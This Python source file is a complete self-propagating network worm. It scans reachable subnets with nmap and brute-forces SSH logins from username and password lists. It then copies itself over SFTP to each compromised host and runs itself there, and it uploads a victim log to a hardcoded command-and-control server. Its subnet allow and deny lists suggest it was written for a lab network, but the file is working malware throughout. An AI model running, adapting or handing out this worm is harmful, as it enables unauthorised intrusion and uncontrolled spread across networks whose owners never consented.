"""
Python 3 Networm
Author: Richard Poschinger (poschinger.net)

"""
import string
import subprocess
import threading
import traceback
from random import shuffle

import netifaces
import nmap
from netaddr import *
import paramiko
from netaddr.fbsocket import AF_INET
from paramiko.ssh_exception import BadHostKeyException, AuthenticationException, SSHException
import os
from termcolor import cprint
from datetime import datetime
from pyroute2 import IPRoute

# Location of the worm (on infected hosts)
LOCAL_TMP_DIRECTORY = "/tmp/networm/"
# Install python3 and other requirements (necessarry if the hosts have not been prepared for the worm execution)
# Set to false if the worm runs in an isolated network without Internet connection
INSTALL_REQUIREMENTS = False
# Allow the worm to scan these subnets
INCLUDED_SUBNETS = ["192.168.0.0/16", "192.169.0.0/16"]
# Exclude these subnets from the scanning process
EXCLUDED_SUBNETS = ["192.168.50.0/24", "192.168.72.0/24"]
# List of usernames
USERNAME_LIST = "namelist.txt"
# List of passwords
PASSWORD_LIST = "passwordlist.txt"
# Name of the victim log file
VICTIM_LOGNAME = "victim.log"
# Name of the message log file (debug messages)
MESSAGE_LOG = "message.log"
# Analyse network routes
ANALYSE_ROUTES = True
# Split up subnets below this subnet size (prefix_len)
SUBNET_MIN = 24
# Use SUDO to execute
SUDO = False

# C&C Server
C_C_SERVER_IP = "192.168.50.1"
C_C_SERVER_USERNAME = "ubuntu"
C_C_SERVER_PASSWORD = "ubuntu"
C_C_SERVER_DIRECTORY = "/tmp/cclogs/"


def main():
    """
    Execute all parts of the worm (composition root)
    """
    # Remove log from other host
    if os.path.isfile(MESSAGE_LOG):
        os.remove(MESSAGE_LOG)
    print_log("Scanning local interfaces", "green")
    local_address_list, total_subnet_list = local_addresses()
    print_log("Scanning routes", "green")
    routed_subnet_list = routes()
    print_log(routed_subnet_list)
    for routed_subnet in routed_subnet_list:
        if routed_subnet not in total_subnet_list:
            total_subnet_list.append(routed_subnet)

    # shuffle to improve scanning (not the same scanning procedure for every infected host)
    print_log("Found " + str(len(total_subnet_list)) + " subnets")
    # just shuffle big subnets (keep splitted subnets together)
    shuffle(total_subnet_list)
    total_subnet_list_filterd = filter_allowed(total_subnet_list)
    print_log("Splitting subnets", "green")
    #check if allowed
    subnet_list = split_subnet(total_subnet_list_filterd)
    subnet_list_filtered = filter_allowed(subnet_list)
    print_log("Generated " + str(len(subnet_list_filtered)) + " subnets")
    print_log(subnet_list_filtered)
    print_log("Updating victim log", "green")
    update_victim_log(local_address_list)
    print_log("Sending victim log", "green")
    send_victim_log(local_address_list)
    print_log("Scanning subnets", "green")
    for subnet in subnet_list_filtered:
        hosts = scan_network(subnet, local_address_list)
        # shuffle to improve scanning (not the same scanning procedure for every infected host)
        shuffle(hosts)
        print_log(hosts)
        print_log("Trying to connect via SSH", "green")
        for host in hosts:
            if allowed(IPAddress(host)):
                connect_via_ssh(host)

def split_subnet(subnet_list):
    """
    Split subnets into subnets with a minimal prefix length defined by SUBNET_MIN
    :param subnet_list: List ob subnets (IPNetwork)
    :return: List ob subnets (IPNetwork)
    """
    new_subnet_list = []
    for subnet in subnet_list:
        if subnet.prefixlen < SUBNET_MIN:
            generated_subnets = list(subnet.subnet(SUBNET_MIN))
            #shuffle generated subnets,
            # rest of the subnet list should remain in the original order to have a better overview
            shuffle(generated_subnets)
            new_subnet_list.extend(generated_subnets)
        else:
            new_subnet_list.append(subnet)
    return new_subnet_list



def send_victim_log(local_address_list):
    """
    Send victim log to C&C Server

    :param local_address_list: list of local addresses
    :return:
    """

    ssh = paramiko.SSHClient()
    # automatically add foreign host (prevent unknown host exception)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cprint("Send to C&C", "blue")
        # add each local interface ip address to the filename
        target_filename = ""
        for address in local_address_list:
            target_filename = target_filename + "_" + str(address)
        target_filename = target_filename + ".txt"
        # connect to cc server
        ssh.connect(C_C_SERVER_IP, username=C_C_SERVER_USERNAME, password=C_C_SERVER_PASSWORD)

        # open scp connection and transfer the file
        local = os.getcwd()
        sftp = ssh.open_sftp()
        try:
            sftp.chdir(C_C_SERVER_DIRECTORY)  # Test if remote_path exists
        except IOError:
            sftp.mkdir(C_C_SERVER_DIRECTORY)
        sftp.put(local + "/" + VICTIM_LOGNAME, C_C_SERVER_DIRECTORY + target_filename)
        sftp.close()
        ssh.close()
    except Exception:
        traceback.print_exc()


def print_log(message, color="white"):
    """
    Print and log messages

    :param message: log message
    :param color: cprint color definition
    """
    with open(MESSAGE_LOG, "a+") as logfile:
        logfile.write(str(message) + "\n")
        cprint(str(message), color)

def routes():
    """
    Get all network route subnets

    :return: All routed networks (IPNetwork)
    """

    # use "ip route" to get all routes
    routes_raw = str(subprocess.check_output(["ip",  "route"]))
    routes_lines = routes_raw.split("\\n")
    networks = []
    # parse "ip route" results
    for route_line in routes_lines:
        # split string (Format e.g.: "192.168.0.0/16 via 192.169.0.1 dev eth0")
        dst_str = route_line.split(" ")[0]
        dst = None
        try:
            # create network
            dst = IPNetwork(dst_str)
            networks.append(dst)
        except AddrFormatError as e:
            pass
    return networks

def local_addresses():
    """
    Get all local addresses of the network interfaces

    :return: All local subnets (IPNetwork), All Local addresses (IPAddress)
    """
    # Currently IPv4 only
    mode_list = [netifaces.AF_INET]

    interfaces = netifaces.interfaces()
    if_ext = []
    subnet_ext = []
    for i in interfaces:
        for mode in mode_list:
            iface = netifaces.ifaddresses(i).get(mode)
            if iface:
                for j in iface:
                    print_log(j)
                    if_ext.append(IPAddress(j['addr']))
                    subnet_ext.append(IPNetwork(j['addr'] + "/" + j['netmask']).cidr)
    return if_ext, subnet_ext


def scan_network(subnet, local_address_list):
    """
    PING Scan

    :param subnet: Subnet which should be scanned
    :param local_address_list: list of local addresses (should not be added to the resulting address list)
    :return: list of addresses as strings
    """
    previously_attacked_ips = read_line_file(VICTIM_LOGNAME)
    hosts = []
    if allowed(subnet):
        print_log("Scanning " + str(subnet))
        # Start Portscan
        nm = nmap.PortScanner()
        nm.scan(hosts=str(subnet), arguments='-sn -T insane')
        # parse results (check if "up")
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
        for host, status in hosts_list:
            if status == "up" and host not in local_address_list:
                if host not in previously_attacked_ips:
                    # add to target list
                    hosts.append(host)
                else:
                    print_log("IP=" + host + " already attacked, skipping")
    else:
        print_log("Subnet " + str(subnet) + " ignored")
    return hosts

def filter_allowed(address_list):
    """
    Filter existing IPAddress/IPNetwork list and return only addresses
    which are allowed by the INCLUDED/EXCLUDED_SUBNET parameter
    :param address_list:
    :return:
    """
    allowed_list = []
    for address in address_list:
        if allowed(address):
            allowed_list.append(address)
    return allowed_list


def allowed(address):
    """
    Check if the subnet or address should be scanned

    :param subnet: subnet (IPNetwork) or address (IPAddress)
    :return: Boolean
    """
    # check if subnet has been excluded
    for excluded_subnet in EXCLUDED_SUBNETS:
        if address in IPNetwork(excluded_subnet) or address == IPNetwork(excluded_subnet):
            return False
    # check if subnet can be attacked
    for allowed_subnet in INCLUDED_SUBNETS:
        if address in IPNetwork(allowed_subnet) or address == IPNetwork(allowed_subnet):
            return True
    return False


def connect_via_ssh(ip):
    """
    Try to connect to the ssh server
    Using password and username file to guess credentials

    :param ip: IP of the SSH Server
    :return: -
    """
    ssh = paramiko.SSHClient()
    passwords = read_line_file(PASSWORD_LIST)
    usernames = read_line_file(USERNAME_LIST)
    # shuffle to improve scanning (not the same scanning procedure for every infected host)
    shuffle(passwords)
    shuffle(usernames)

    # automatically add foreign host (prevent unknown host exception)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #try each username:password pair
    for username in usernames:
        for password in passwords:
            print_log(ip + ":" + username + ":" + password)
            successful = False
            try:
                #Try to connect
                ssh.connect(ip, username=username, password=password)
                cprint("Connected successfully", "red")
                successful = True
            except (AuthenticationException, BadHostKeyException) as e:
                print_log("Could not authenticate")
            except (SSHException, EOFError) as e:
                print_log("Can not connect: " + str(e))
            except Exception as e:
                print_log("Can not connect: " + str(e))
                return
            # Spread if the connection has been established
            if successful:
                spread(ssh)


def check_if_already_attacked(ssh):
    """
    Check if the connected host has already been attacked
    If the LOCAL_TMP_DIRECTORY exists, the worm has probably already been executed or is running.

    :param ssh: Active SSH Connection
    :return: Bool
    """
    sftp = ssh.open_sftp()
    try:
        # chdir fill raise an error if the directory exists
        sftp.chdir(LOCAL_TMP_DIRECTORY)
    except IOError:
        return False
    sftp.close()
    return True


def update_victim_log(ip_list):
    """
    Add current host to the victim list/log
    :param ip_list: list of local addresses
    """
    with open(VICTIM_LOGNAME, 'a+') as logfile:
        # Write Timestamp
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        logfile.write("--- Attacked:" + date_time + "\n")
        # Write local IPs
        for ip in ip_list:
            logfile.write(str(ip) + "\n")
        logfile.write("\n")


def spread(ssh):
    """
    Spread and execute the worm to a host

    :param ssh: Active SSH Connection
    :return: -
    """
    # check if the host has already been attacked and skip if true
    attacked = check_if_already_attacked(ssh)
    if attacked:
        print_log("Found worm on remote host, already attacked. Skipping...", "red")
        return
    # transfer the worm
    print_log("Transfering worm", "red")
    transfer(ssh)
    # execute the worm
    print_log("Executing worm", "red")
    setup_and_execute(ssh)


def transfer(ssh):
    """
    Transfer the worm

    :param ssh: Active SSH Connection
    """
    # current directory
    source = os.getcwd()
    target = LOCAL_TMP_DIRECTORY
    # open SSH connection
    sftp = ssh.open_sftp()
    sftp.mkdir(LOCAL_TMP_DIRECTORY)
    # Transfer each file/directory
    for item in os.listdir(source):
        # transfer file
        if os.path.isfile(os.path.join(source, item)):
            sftp.put(os.path.join(source, item), '%s/%s' % (target, item))
        # transfer directory
        else:
            sftp.mkdir('%s/%s' % (target, item), ignore_existing=True)
            sftp.put_dir(os.path.join(source, item), '%s/%s' % (target, item))
    sftp.close()


def read_line_file(filename):
    """
    Read file

    :param filename: name of the file
    :return: content (lines)
    """
    with open(filename) as f:
        content = f.readlines()
    content = [x.strip() for x in content]
    return content


def setup_and_execute(ssh):
    """
    Setup and execute the worm on a remote host

    :param ssh: Active SSH Connection
    """
    if INSTALL_REQUIREMENTS:
        exec_command(ssh, "apt-get install python3 python3-pip unzip nmap iproute2 -y")
        exec_command(ssh, "pip3 install - r " + LOCAL_TMP_DIRECTORY + "requirements.txt")
    t = threading.Thread(target=exec_command, args=(ssh, "(cd " + LOCAL_TMP_DIRECTORY + "; python3 networm.py)"))
    t.start()


def exec_command(ssh, command):
    """
    Execute command via SSH and print result

    :param ssh: Active SSH Connection
    :param command: Command
    """
    if SUDO:
        command = "sudo " + command
    stdin, stdout, stderr = ssh.exec_command(command)
    print_log(stdout.readlines())
    print_log(stderr.readlines())


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        traceback.print_exc()
